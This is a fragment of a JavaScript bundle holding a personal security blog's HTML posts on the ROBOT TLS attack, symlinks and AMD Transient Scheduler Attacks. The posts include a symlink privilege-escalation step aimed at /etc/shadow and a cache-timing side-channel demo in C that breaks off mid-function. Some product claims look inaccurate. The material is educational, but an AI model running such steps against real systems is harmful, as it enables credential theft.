  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,pv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,dv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,hv=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

